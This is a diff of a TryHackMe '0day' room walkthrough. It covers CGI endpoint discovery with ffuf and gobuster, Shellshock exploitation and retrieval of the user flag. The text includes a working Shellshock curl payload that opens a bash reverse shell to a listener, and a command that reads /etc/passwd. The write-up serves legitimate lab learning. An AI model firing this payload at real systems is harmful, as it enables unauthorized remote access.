@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-11T12:21:41.550+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-11T12:29:13.764+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
 ---
 
 
@@ -101,7 +101,9 @@ Apache HTTP Server 1.3.22 through 1.3.27 on OpenBSD allows remote attackers to o
 
 Port 68 which is used by the DHCP is open/filtered. Filtered suggests that the firewall is blocking the requests from nmap. Further investigation must be done to confirm the availability of the service. 
 
-#### Looking for Shellshock Vulnerability
+-------
+
+### Looking for Shellshock Vulnerability
 
 /test.cgi endpoint reveals 
 
@@ -110,7 +112,12 @@ ffuf -u http://10.81.145.65/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.tx
 t -e .cgi,.sh,.p1,.py
 ```
 
+Looking a bit online without revealing the steps it is clear that the intended attack path is the shellshock vulnerability. I had to check for something useful since my enumeration led me nowhere. 
+
 ![](/img/user/Attachments/testcgi.png)
+
+
+With the use of gobuster and ffuf  the **test** endpoint is revealed and by the looks of it there is not much revealing. However perhaps it is the missing piece. 
 
 ```bash
 gobuster dir -u http://10.81.145.65/cgi-bin -w /usr/share/wordlists/dirb/common  
@@ -119,7 +126,10 @@ gobuster dir -u http://10.81.145.65/cgi-bin -w /usr/share/wordlists/dirb/common
 
 ![](/img/user/Attachments/gobuster-test.png)
 
-Let's test for the shellshock vulnerability against this endpoint since no CVE was revealed during the use of nmap or nikto
+Let's test for the shellshock vulnerability against this endpoint since no CVE was revealed during the use of nmap or nikto. Now for crafting the payload 
+
+----
+## Exploitation
 
 **Step 1 Set up a Listener**
 ```bash
@@ -136,16 +146,24 @@ curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.225.98/4444 0>&
 
 And it appears it is indeed vulnerable to the Shellshock vulnerability. A connection has been received by netcat.
 
+Let's explore the users on the system
 
+```bash
+cat /etc/passwd | grep /home
+```
 
+Running the command above reveals a user **ryan**. Let's explore his home directory and check for the **user** flag.
 
+![](/img/user/Attachments/user-flag.png)
+
+Sure enough it is indeed in his home directory. 
 
 
 
 
 
 -----
-## Exploitation
+
 
 
 
